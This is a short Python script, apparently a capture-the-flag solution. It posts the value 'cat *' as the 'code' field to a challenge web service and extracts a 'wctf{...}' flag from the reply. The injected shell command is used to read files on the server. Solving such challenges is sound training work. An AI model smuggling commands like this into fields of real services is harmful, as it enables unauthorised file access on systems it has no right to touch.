import requests
import re

data = {
    'name': 'target',
    'code': 'cat *'
}

response = requests.post('https://madesense-okntin33tq-ul.a.run.app/make', data=data)
flag = re.findall(r'wctf{.*}', response.text)

print(flag)
